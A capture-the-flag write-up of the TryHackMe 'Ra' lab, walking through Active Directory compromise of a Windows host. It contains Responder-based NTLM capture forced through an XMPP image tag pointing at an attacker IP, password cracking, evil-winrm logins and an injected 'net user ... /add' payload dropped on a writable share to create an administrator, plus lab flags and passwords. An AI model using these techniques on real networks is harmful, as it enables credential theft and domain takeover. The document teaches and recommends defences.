# TryHackMe — Ra (Active Directory Exploitation)

**Category:** Offensive Security / Active Directory Penetration Testing
**Domain:** `windcorp.thm`
**Target Host:** `Fire.windcorp.thm` (Windows Server 2019, `10.48.190.199`)
**Skills demonstrated:** AD service enumeration, credential harvesting via information disclosure, LLMNR/NTLM relay-adjacent capture (Responder), NTLMv2 hash cracking, WinRM access, Windows privilege enumeration, SMB write-share abuse for local privilege escalation

---

## 1. Scenario

The target was a single Windows Server 2019 host that also served as the domain controller/member for `windcorp.thm`, exposing a broad Active Directory service footprint alongside a public-facing IIS web application. The engagement objective was to progress from unauthenticated network access to full domain administrator privileges, capturing three flags along the way as proof of exploitation at each major milestone: initial domain foothold, authenticated shell access, and full administrative compromise.

## 2. Objectives

1. Enumerate the domain environment and identify exposed services.
2. Obtain an initial set of valid domain credentials.
3. Harvest additional credentials from internal domain traffic.
4. Gain interactive remote access to the host.
5. Identify and abuse a privilege-escalation path to reach local/domain administrator.
6. Capture all three flags demonstrating exploitation at each stage.

## 3. Reconnaissance

A full TCP port scan was run against the target to establish the service footprint:

```bash
nmap -p- -sC -sV -T4 -Pn 10.48.190.199
```

**Key services identified:**

| Port(s) | Service | Notes |
|---|---|---|
| 53 | DNS | Domain name resolution |
| 80 | HTTP | IIS 10.0, hosting a "Windcorp" branded login portal |
| 88 | Kerberos | Active Directory authentication |
| 389 / 636 | LDAP / LDAPS | Directory services |
| 445 | SMB | File sharing |
| 3389 | RDP | Remote desktop |
| 5985 | WinRM | Remote PowerShell management |
| 5222–5276 | XMPP (Openfire) | Internal messaging platform |
| 9090 / 9091 | Apache Hadoop | Big-data services (out of primary attack path) |

**Domain information:**
- Domain: `windcorp.thm`
- Hostname: `Fire.windcorp.thm`
- OS: Windows Server 2019

The combination of a full AD service stack, an internal messaging service (Openfire/XMPP), and a public web login page indicated multiple viable entry points, so enumeration proceeded methodically across each surface rather than jumping straight to exploitation.

## 4. Initial Access — Web-Based Information Disclosure

The IIS-hosted login portal on port 80 presented a standard authentication form. Inspecting the page's image resource revealed an embedded filename that inadvertently disclosed personal information tied to a valid account — specifically, a pet's name associated with the user `lilyle`, a common security-question/password-hint pattern.

Using this disclosed value, the account's password was reset to a known value (`ChangeMe#1234`), yielding the first authenticated foothold into the domain.

## 5. Credential Validation and Share Enumeration

With credentials in hand, CrackMapExec was used to validate domain access and enumerate accessible SMB shares:

```bash
crackmapexec smb windcorp.thm -u lilyle -p 'ChangeMe#1234' --shares
smbclient -U lilyle //10.48.190.199/Shared
```

This confirmed valid domain authentication and exposed a share containing the first flag.

**Flag 1:** `THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}`

## 6. Credential Harvesting — LLMNR Poisoning via XMPP

With one domain account compromised, the next objective was to harvest credentials for additional users to expand access. Given the presence of SMB, LDAP, and an internal XMPP messaging service, an LLMNR/NBT-NS poisoning attack was identified as a viable path to capture NTLM authentication attempts from other domain clients.

**Listener setup:**
```bash
sudo responder -I tun0
```

Using the compromised `lilyle` account, an XMPP message was sent containing a remotely-hosted image reference:
```html
<img src="http://10.8.82.29/a.png">
```

When another domain user, `buse`, opened the message, their client automatically attempted NTLM authentication to the attacker-controlled listener when resolving the embedded image — a classic forced-authentication technique that requires no exploit, only a client that automatically renders remote content.

**Result:** Responder captured an NTLMv2 challenge-response hash for `WINDCORP\buse`.

## 7. Offline Hash Cracking

The captured NTLMv2 hash was saved locally and cracked offline using John the Ripper against the `rockyou.txt` wordlist:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Recovered credentials:** `buse : uzunLM+3131`

## 8. Credential Validation and Remote Access

The cracked credentials were validated across the domain:

```bash
crackmapexec smb windcorp.thm -u buse -p 'uzunLM+3131'
```

Authentication succeeded, confirming both a valid domain account and SMB accessibility. This was then used to establish an interactive remote shell via WinRM:

```bash
evil-winrm -i 10.48.190.199 -u buse -p 'uzunLM+3131'
```

This yielded interactive access to the host and the second flag.

**Flag 2:** `THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}`

## 9. Privilege Enumeration

Inside the authenticated session, current privileges were reviewed:

```powershell
whoami /all
```

**Notable enabled privileges:**
- `SeMachineAccountPrivilege`
- `SeChangeNotifyPrivilege`
- `SeIncreaseWorkingSetPrivilege`

`SeMachineAccountPrivilege` stood out as the critical finding — this right permits a user to join computer accounts to the domain and is a well-known Active Directory privilege-escalation primitive when combined with other misconfigurations, though in this case the more direct escalation path came from a writable SMB share rather than machine-account abuse itself.

## 10. Privilege Escalation — Writable SMB Share Abuse

Further share enumeration revealed a writable SMB share (`brittanycr`) accessible to the `buse` account. A malicious payload file was crafted locally:

```
;net user dazzy passwors123! /add;net localgroup Administrators dazzy /add
```

This payload, when interpreted/executed on the target, creates a new local user and immediately adds it to the local Administrators group.

**Payload delivery:**
```bash
smbclient //10.48.190.199/brittanycr -U buse
put hosts.txt
```

Once the file was processed on the target, the new administrative account became active.

## 11. Full Administrative Access

The newly created account was used to re-establish a WinRM session with elevated privileges:

```bash
evil-winrm -i 10.48.190.199 -u dazzy -p 'passwors123!'
```

This session confirmed full **Administrator**-level access, allowing retrieval of the final flag:

```powershell
type C:\Users\Administrator\Desktop\Flag3.txt
```

**Flag 3:** `THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}`

## 12. Attack Chain Summary

```
Nmap recon → Full AD service stack + IIS web login exposed
      │
      ▼
Web info disclosure (pet-name hint) → lilyle password reset
      │
      ▼
CrackMapExec + SMB → domain access confirmed → Flag 1
      │
      ▼
Responder (LLMNR poisoning) + XMPP-triggered image load → buse NTLMv2 hash captured
      │
      ▼
John the Ripper (rockyou.txt) → buse cracked credentials
      │
      ▼
Evil-WinRM → interactive shell as buse → Flag 2
      │
      ▼
whoami /all → SeMachineAccountPrivilege identified
      │
      ▼
Writable SMB share (brittanycr) → malicious user-creation payload uploaded
      │
      ▼
New local admin account (dazzy) created
      │
      ▼
Evil-WinRM as dazzy → full Administrator access → Flag 3
```

## 13. Vulnerability & Exploitation Assessment

| # | Finding | Severity | Root Cause |
|---|---|---|---|
| 1 | Password hint/personal information exposed via public web resource (image filename) | High | Insecure password-reset flow relying on guessable/exposed personal information |
| 2 | LLMNR/NBT-NS enabled on the domain, allowing forced NTLM authentication capture | High | Legacy name-resolution protocols left enabled without network-level hardening |
| 3 | Internal messaging (XMPP) permits automatic rendering of externally-hosted images | Medium | Client auto-loads remote content, enabling forced-authentication attacks with no exploit required |
| 4 | Weak, wordlist-crackable password for user `buse` (`uzunLM+3131`) | High | Inadequate password complexity/rotation policy |
| 5 | SMB share writable by a standard domain user, permitting arbitrary payload upload | Critical | Excessive share permissions / lack of least-privilege on file shares |
| 6 | Local privilege escalation via share-triggered command execution leading to new Administrator account | Critical | Combination of writable share + automatic processing of dropped files on the host |
| 7 | Standard user granted `SeMachineAccountPrivilege` | Medium | Over-privileged account rights not aligned with job function |

## 14. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence |
|---|---|---|---|
| Reconnaissance | [T1595.001](https://attack.mitre.org/techniques/T1595/001/) | Active Scanning: Scanning IP Blocks | Full TCP Nmap scan of the target |
| Credential Access | [T1589.001](https://attack.mitre.org/techniques/T1589/001/) | Gather Victim Identity Information: Credentials | Password hint (pet name) exposed via public web resource |
| Initial Access | [T1078](https://attack.mitre.org/techniques/T1078/) | Valid Accounts | Domain login as `lilyle` after password reset |
| Discovery | [T1135](https://attack.mitre.org/techniques/T1135/) | Network Share Discovery | `crackmapexec --shares` / `smbclient` enumeration |
| Credential Access | [T1557.001](https://attack.mitre.org/techniques/T1557/001/) | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | Responder capturing NTLM authentication triggered via XMPP-delivered image |
| Credential Access | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) | Brute Force: Password Cracking | John the Ripper cracking the captured NTLMv2 hash with `rockyou.txt` |
| Lateral Movement | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Remote Services: Windows Remote Management | Evil-WinRM session as `buse` |
| Discovery | [T1069.002](https://attack.mitre.org/techniques/T1069/002/) / [T1033](https://attack.mitre.org/techniques/T1033/) | Permission Groups Discovery / System Owner/User Discovery | `whoami /all` privilege enumeration |
| Persistence / Privilege Escalation | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | `net user dazzy ... /add` payload delivered via writable share |
| Privilege Escalation | [T1078.003](https://attack.mitre.org/techniques/T1078/003/) | Valid Accounts: Local Accounts | New `dazzy` administrator account used for final access |
| Lateral Movement | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Remote Services: Windows Remote Management | Evil-WinRM session as `dazzy` with Administrator rights |

## 15. OWASP Top 10 Mapping (Web-Facing Root Cause)

The initial foothold in this chain originated from the public IIS web login page, making a brief OWASP mapping relevant to that entry point:

| OWASP Category | Relevance |
|---|---|
| **A01:2021 – Broken Access Control** | A publicly accessible web resource exposed personal information (a password hint) that should not have been reachable without authentication |
| **A07:2021 – Identification and Authentication Failures** | The password-reset mechanism relied on a guessable/exposed personal detail rather than a secure verification process, and the resulting and subsequent domain passwords were weak enough to be cracked from a common wordlist |
| **A05:2021 – Security Misconfiguration** | Legacy protocols (LLMNR/NBT-NS) left enabled at the network level, and an SMB share left writable by standard domain users, both reflect insecure default configuration rather than intentional design |

## 16. Remediation Recommendations

| Finding | Recommendation |
|---|---|
| Personal-info password hints exposed publicly | Remove personal identifiers from public web assets; use a secure, verified password-reset workflow (e.g., email/MFA-based) instead of security questions |
| LLMNR/NBT-NS enabled | Disable LLMNR and NBT-NS via Group Policy across the domain; rely solely on DNS for name resolution |
| XMPP auto-loading remote images | Disable automatic remote content/image loading in the messaging client, or restrict outbound connections to approved domains only |
| Weak domain passwords | Enforce a strong password policy with minimum complexity and length, and screen new passwords against known breach/wordlist databases |
| Writable SMB shares | Apply least-privilege share and NTFS permissions; audit all shares for unnecessary write access by standard users |
| Unrestricted file processing from shares | Ensure dropped files on shares are not automatically executed/processed by privileged host processes or scheduled jobs |
| Over-privileged accounts (`SeMachineAccountPrivilege`) | Review and restrict user rights assignments to only what is required for each role; avoid granting AD-join rights to standard users |

## 17. Key Takeaways

- **Small information leaks compound into full domain compromise.** A single exposed password hint was the first domino in a chain that ended in domain administrator access — no individual step required an advanced exploit.
- **Legacy name-resolution protocols remain a reliable attack path.** LLMNR/NBT-NS poisoning continues to work in modern AD environments simply because it is rarely disabled by default, and any mechanism that forces a client to attempt authentication (here, an internal chat client loading an image) is enough to trigger it.
- **Writable file shares are a direct privilege-escalation vector.** Once a share can be written to by a standard user and its contents are processed with elevated context, the effective privilege boundary of that share becomes irrelevant.
- **User rights assignments deserve the same scrutiny as group memberships.** `SeMachineAccountPrivilege` on a standard account is easy to overlook in a permissions review but represents a real Active Directory escalation primitive.

## 18. Conclusion

This engagement demonstrates a realistic, low-complexity path to full Active Directory compromise built entirely from common, individually "minor" misconfigurations: a personal-information leak, legacy broadcast-protocol poisoning, a weak password, and an over-permissioned file share. None of these findings required a novel exploit, reinforcing that AD environments are most often compromised through configuration and hygiene failures rather than zero-day vulnerabilities.
